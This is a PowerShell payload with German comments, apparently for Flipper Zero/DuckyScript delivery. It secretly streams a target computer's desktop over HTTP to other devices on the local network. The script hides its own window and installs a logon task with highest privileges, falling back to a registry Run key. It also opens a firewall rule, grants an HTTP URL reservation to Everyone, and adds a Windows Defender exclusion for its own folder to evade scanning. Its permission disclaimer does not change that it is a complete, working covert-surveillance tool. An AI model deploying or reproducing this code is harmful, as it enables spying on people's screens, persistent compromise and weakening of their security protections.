<#
================================================================================
 Screenshare over LAN - HTTP-Stream des Desktops (DuckyScript/Flipper Zero)

 SYNOPSIS
   Startet einen HTTP-Server auf dem Zielrechner und streamt den Desktop
   in den Browser eines anderen Geraets im selben Netzwerk.

 USAGE
   1. Payload auf dem Ziel starten (DuckyScript/Flipper Zero, Administrator)
   2. Auf einem anderen Geraet im selben Netz: http://<LAN-IP des Ziels>:8080
   3. Beenden: ESC auf dem Ziel 5 Sekunden lang gedrueckt halten.

 DIFFERENCES TO THE OFFICIAL HAK5 PAYLOAD
   * DPI-korrekte Bildschirmaufnahme (ohne den Bug "nur obere linke Ecke")
   * JPEG + optionale Verkleinerung -> deutlich weniger Bandbreite
   * Bild skaliert immer auf das ganze Browserfenster (object-fit)
   * Firewall-Regel wird vor dem Anlegen bereinigt (kein Duplikat-Fehler)
   * IP-Erkennung ueber die Standardroute statt Regex 'Wi*'/'Eth*'
   * Fallback auf http://+:PORT/ wenn keine IP ermittelt werden kann
   * $hide / $port / $maxWidth / $jpegQuality / $fps sind oben konfigurierbar
   * Autostart: Task im Task-Planer, startet bei jedem Login mit hoechsten
     Rechten (siehe $autostart unten). Entfernen mit -RemoveAutostart.

 WICHTIG: Nur auf Systemen einsetzen, die dir gehoeren bzw. fuer die du eine
 ausdrueckliche Erlaubnis hast.
================================================================================
#>

# ---------------------------------------------------------------- Konfiguration
param(
    [switch]$RemoveAutostart   # nur: Autostart entfernen und beenden
)

$hide         = 1     # 1 = Fenster nach 4 s ausblenden
$port         = 8080  # TCP-Port des HTTP-Servers
$maxWidth     = 1600  # 0 = keine Verkleinerung (sonst auf max. Breite skalieren)
$jpegQuality  = 70    # 10-100 (hoeher = groesser/schoener, mehr Bandbreite)
$fps          = 20    # Bilder pro Sekunde
$exitSeconds  = 5     # ESC-Dauer zum Beenden
$autostart    = 1     # 1 = Task im Task-Planer anlegen (startet bei jedem Login)
$taskName     = 'Screenshare-Over-LAN'

$selfPath = $MyInvocation.MyCommand.Path
$isAdmin  = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# --- Autostart: Trigger "Bei Anmeldung", nicht "Beim Systemstart" ---------
# Ein Task mit Trigger "Beim Systemstart" laeuft in Session 0 und sieht
# keinen Desktop - der Screenshot waere dann schwarz. Der Trigger
# "Bei Anmeldung" laeuft dagegen in der Sitzung des angemeldeten Benutzers,
# der Bildschirm ist also sichtbar. "Mit hoechsten Rechten" bedeutet:
# beim Anmelden erscheint keine UAC-Abfrage, Firewall, URL-Reservierung
# und die Defender-Ausnahme greifen also ebenfalls.
if ($RemoveAutostart) {
    try {
        $out = schtasks /delete /tn $taskName /f 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host ("Autostart entfernt (Task '" + $taskName + "').") -ForegroundColor Yellow
        }
    } catch { }
    try {
        $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)
        if ($rk) {
            $rk.DeleteValue('Screenshare-Over-LAN', $false)
            $rk.Close()
            Write-Host "Autostart entfernt (Registry-Eintrag)." -ForegroundColor Yellow
        }
    } catch { }
    exit 0
}

if ($autostart -eq 1 -and $selfPath) {
    try {
        $psExe   = (Get-Process -Id $pid).Path
        $dir     = Split-Path -Parent $selfPath
        $cmdFile = Join-Path $dir 'run.cmd'
        # Leerer Titel ist wichtig: das erste Argument von 'start' in Quotes
        # ist der Fenstertitel, nicht das Programm.
        $cmdText = "@echo off" + [Environment]::NewLine +
                   ('start "" "' + $psExe + '" -w h -ExecutionPolicy Bypass -File "' + $selfPath + '"') + [Environment]::NewLine
        Set-Content -LiteralPath $cmdFile -Value $cmdText -Encoding ASCII

        $out = schtasks /create /tn $taskName /tr $cmdFile /sc onlogon /rl highest /f 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host ("Autostart eingerichtet: Task '" + $taskName + "' startet bei jeder Anmeldung mit hoechsten Rechten.") -ForegroundColor Green
        } else {
            Write-Host ("Task-Planer nicht verfuegbar (" + (($out | Select-Object -First 1) -join '') + ") - weiche auf den Registry-Autostart aus.") -ForegroundColor Yellow
            # Fallback: HKCU\...\Run - startet bei jeder Anmeldung in der
            # interaktiven Sitzung. Laeuft dann ohne Administratorrechte,
            # Firewall-Regel und URL-Reservierung muessen also bereits
            # von einem vorherigen elevated Start existieren.
            $cmdLine = '"' + $psExe + '" -w h -ExecutionPolicy Bypass -File "' + $selfPath + '"'
            $rk = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey('Software\Microsoft\Windows\CurrentVersion\Run', $true)
            if ($rk) {
                $rk.SetValue('Screenshare-Over-LAN', $cmdLine, [Microsoft.Win32.RegistryValueKind]::String)
                $rk.Close()
                Write-Host "Autostart eingerichtet: Registry HKCU\...\Run\Screenshare-Over-LAN" -ForegroundColor Green
            } else {
                Write-Host "Autostart FEHLGESCHLAGEN: Registry-Eintrag nicht schreibbar." -ForegroundColor Red
            }
        }
    } catch {
        Write-Host ("Autostart konnte nicht eingerichtet werden: " + $_.Exception.Message) -ForegroundColor Yellow
    }
}

if (-not $isAdmin) {
    Write-Host "WARNUNG: Keine Administratorrechte - Firewall-Regel, URL-Reservierung und Defender-Ausnahme werden nicht angelegt." -ForegroundColor Red
}

# ------------------------------------------------- DPI: Voraussetzung fuer Capture
# PowerShell ist per Default nicht einheitlich DPI-aware. Dadurch greift
# CopyFromScreen auf skalierten Displays (z. B. 150 %/200 %) nur einen
# Ausschnitt oben links und skaliert ihn auf die Bitmap-Groesse.
# Fix: Prozess explizit DPI-aware machen (vorab geerbte Awareness bleibt
# erhalten) und das Ziel-Bitmap auf exakt die Screen-DPI setzen, damit
# GDI+ keine Umrechnung vornimmt.
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class ScreenDpi {
    [DllImport("user32.dll")] public static extern bool SetProcessDPIAware();
    [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
    [DllImport("gdi32.dll")]  public static extern int GetDeviceCaps(IntPtr hdc, int index);
    [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
}
"@
[ScreenDpi]::SetProcessDPIAware() | Out-Null

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Konsolen-Kosmetik darf nie das Script abbrechen
try {
    [Console]::BackgroundColor = "Black"
    Clear-Host
    [Console]::SetWindowSize(88, 30)
    [Console]::Title = "HTTP Screenshare"
} catch { }

# Bildschirm-DPI (physisch, da der Prozess jetzt DPI-aware ist)
$hdc = [ScreenDpi]::GetDC([IntPtr]::Zero)
$screenDpi = [ScreenDpi]::GetDeviceCaps($hdc, 88)   # LOGPIXELSX
[ScreenDpi]::ReleaseDC([IntPtr]::Zero, $hdc) | Out-Null
if ($screenDpi -lt 72 -or $screenDpi -gt 960) { $screenDpi = 96 }
Write-Host ("Screen DPI: " + $screenDpi) -ForegroundColor DarkGray

# Define port number
if ($port -lt 1) {
    Write-Host "Using default port.. (8080)" -ForegroundColor Green
    $port = 8080
}

Write-Host "Detecting primary network interface." -ForegroundColor DarkGray

# --- Robust: IP des Interfaces mit der Standardroute ermitteln ---------------
$localIP = $null
try {
    $ifAlias = (Get-NetRoute -DestinationPrefix '0.0.0.0/0' -ErrorAction Stop |
                Sort-Object -Property RouteMetric |
                Select-Object -First 1).InterfaceAlias
} catch {
    $ifAlias = $null
}

if ($ifAlias) {
    Write-Output "Primary interface: $ifAlias"
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $ifAlias -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if (-not $localIP) {
    # Fallback: erste brauchbare IPv4-Adresse
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue |
                Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
                Select-Object -First 1).IPAddress
}

if ($localIP) {
    Write-Output "Using IP address: $localIP"
} else {
    Write-Output "No IP address found - binding to all interfaces."
}

# --- Firewall: bestehende Regel entfernen, dann neu anlegen -----------------
Get-NetFirewallRule -DisplayName "AllowWebServer" -ErrorAction SilentlyContinue |
    Remove-NetFirewallRule -ErrorAction SilentlyContinue
New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -ErrorAction SilentlyContinue | Out-Null

# --- Defender-Ausnahme fuer das eigene Verzeichnis ------------------------
# Damit AMSI/Defender das Script nicht blockiert, wird der Ordner, in dem
# dieses Script liegt, ausgenommen. Funktioniert nur mit Administratorrechten
# und nur wenn die Tamper Protection nicht aktiv ist - Fehler sind egal.
try {
    $selfDir = Split-Path -Parent $MyInvocation.MyCommand.Path
    if ($selfDir) {
        Add-MpPreference -ExclusionPath $selfDir -ErrorAction SilentlyContinue
    }
} catch { }

# --- URL-Reservation ------------------------------------------------------
# Ohne Reservierung verweigert HTTP.sys dem HttpListener den Prefix
# ("Access is denied"). Benoetigt Administratorrechte.
# Hinweis: 'Everyone' gilt hier nur fuer die lokale Rechteverwaltung von
# HTTP.sys. Wer enger will, nimmt 'Administrators'.
try {
    netsh http add urlacl url=http://+:$port/ user=Everyone | Out-Null
} catch { }

# --- HttpListener ----------------------------------------------------------
$webServer = New-Object System.Net.HttpListener
if ($localIP) {
    $webServer.Prefixes.Add("http://${localIP}:${port}/")
    $webServer.Prefixes.Add("http://localhost:${port}/")
} else {
    # Kein spezifischer Host -> alle Interfaces
    $webServer.Prefixes.Add("http://+:${port}/")
}
try {
    $webServer.Start()
} catch {
    Write-Host ("FEHLER: Der HTTP-Server liess sich nicht starten: " + $_.Exception.Message) -ForegroundColor Red
    Write-Host "Haeufigste Ursache: keine Administratorrechte - dann fehlt die" -ForegroundColor Red
    Write-Host "URL-Reservierung (http://+:PORT/ user=Everyone) fuer HTTP.sys." -ForegroundColor Red
    Write-Host "Gegenprobe: netsh http show urlacl | findstr :$port" -ForegroundColor DarkGray
    exit 1
}
if (-not $webServer.IsListening) {
    Write-Host "FEHLER: Der HTTP-Server laeuft nicht. Bitte mit Administratorrechten starten." -ForegroundColor Red
    exit 1
}

if ($localIP) {
    $urlText = "http://" + $localIP + ":" + $port
    Write-Host ("Network Devices Can Reach the server at : " + $urlText)
} else {
    $urlText = "http://<IP des Ziels>:" + $port
    Write-Host ("Server listening on all interfaces, port : " + $port) -ForegroundColor Cyan
}
Write-Host "Press escape key for 5 seconds to exit" -f Cyan

# --- Hinweis per Tray-Balloon (das Fenster ist versteckt) --------------------
try {
    $notify = New-Object System.Windows.Forms.NotifyIcon
    $notify.Icon = [System.Drawing.SystemIcons]::Information
    $notify.BalloonTipTitle = "Screenshare aktiv"
    $notify.BalloonTipText = ("Aufruf: " + $urlText)
    $notify.Visible = $true
    $notify.ShowBalloonTip(8000)
} catch { }

# Code to hide the console on Windows 10 and 11
if ($hide -eq 1){
    Write-Host "Hiding this window.." -f Yellow
    Start-Sleep -Seconds 4
    try {
        $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
        $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
        $hwnd = (Get-Process -PID $pid).MainWindowHandle

        if ($hwnd -ne [System.IntPtr]::Zero) {
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else {
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    } catch { }
}

# Escape to exit key detection
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@
$VK_ESCAPE = 0x1B
$startTime = $null

# JPEG-Encoder einmalig vorbereiten
$jpegCodec = $null
try {
    $jpegCodec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() |
                 Where-Object { $_.MimeType -eq 'image/jpeg' } | Select-Object -First 1
} catch { }
$encParams = New-Object System.Drawing.Imaging.EncoderParameters 1
$encParams.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality), ([long]$jpegQuality)

$frameInterval = [int](1000 / $fps)
if ($frameInterval -lt 20) { $frameInterval = 20 }

while ($true) {
    try {
        $context = $webServer.GetContext()
        $response = $context.Response
        if ($context.Request.RawUrl -eq "/stream") {
            $response.ContentType = "multipart/x-mixed-replace; boundary=frame"
            $response.Headers.Add("Cache-Control", "no-cache")
            $boundary = "--frame"

            while ($context.Response.OutputStream.CanWrite) {
                # --- Bildschirm aufnehmen (DPI-korrekt) ---------------------
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen
                $rect = $screen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap $rect.Width, $rect.Height
                $bitmap.SetResolution($screenDpi, $screenDpi)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($rect.X, $rect.Y, 0, 0, $rect.Size)
                $graphics.Dispose()

                # --- optional auf max. Breite verkleinern -------------------
                if ($maxWidth -gt 0 -and $rect.Width -gt $maxWidth) {
                    $newHeight = [int][Math]::Round($rect.Height * ($maxWidth / $rect.Width))
                    $small = New-Object System.Drawing.Bitmap $maxWidth, $newHeight
                    $small.SetResolution($screenDpi, $screenDpi)
                    $g2 = [System.Drawing.Graphics]::FromImage($small)
                    $g2.InterpolationMode = [System.Drawing.Drawing2D.InterpolationMode]::HighQualityBicubic
                    $g2.DrawImage($bitmap, 0, 0, $maxWidth, $newHeight)
                    $g2.Dispose()
                    $bitmap.Dispose()
                    $bitmap = $small
                }

                # --- JPEG kodieren ------------------------------------------
                $stream = New-Object System.IO.MemoryStream
                if ($jpegCodec) {
                    $bitmap.Save($stream, $jpegCodec, $encParams)
                } else {
                    $bitmap.Save($stream, [System.Drawing.Imaging.ImageFormat]::Jpeg)
                }
                $bitmap.Dispose()
                $bytes = $stream.ToArray()
                $stream.Dispose()

                $writer = [System.Text.Encoding]::ASCII.GetBytes("$boundary`r`nContent-Type: image/jpeg`r`nContent-Length: $($bytes.Length)`r`n`r`n")
                $response.OutputStream.Write($writer, 0, $writer.Length)
                $response.OutputStream.Write($bytes, 0, $bytes.Length)
                $boundaryWriter = [System.Text.Encoding]::ASCII.GetBytes("`r`n")
                $response.OutputStream.Write($boundaryWriter, 0, $boundaryWriter.Length)
                $response.OutputStream.Flush()

                Start-Sleep -Milliseconds $frameInterval

                # Check for the escape key press to exit
                $isEscapePressed = [Keyboard]::GetAsyncKeyState($VK_ESCAPE) -lt 0
                if ($isEscapePressed) {
                    if (-not $startTime) {
                        $startTime = Get-Date
                    }
                    $elapsedTime = (Get-Date) - $startTime
                    if ($elapsedTime.TotalSeconds -ge $exitSeconds) {
                        try { $notify.Visible = $false; $notify.Dispose() } catch { }
                        (New-Object -ComObject Wscript.Shell).Popup("Screenshare Closed.",3,"Information",0x0)
                        Start-Sleep -Seconds 1
                        exit
                    }
                } else {
                    $startTime = $null
                }
            }
        } else {
            $response.ContentType = "text/html"
            $html = @"
<!DOCTYPE html>
<html>
<head>
    <title>Streaming Video</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    html, body {
        margin: 0;
        padding: 0;
        background-color: #000;
        height: 100%;
        overflow: hidden;
    }
    img {
        display: block;
        width: 100vw;
        height: 100vh;
        object-fit: contain;
    }
</style>
</head>
<body>
    <img src='/stream' alt='Streaming Video' />
</body>
</html>
"@
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.OutputStream.Write($buffer, 0, $buffer.Length)
        }
        $response.Close()
    } catch {
        Write-Host "Error encountered: $_"
        Start-Sleep -Milliseconds 500
    }
}
$webServer.Stop()
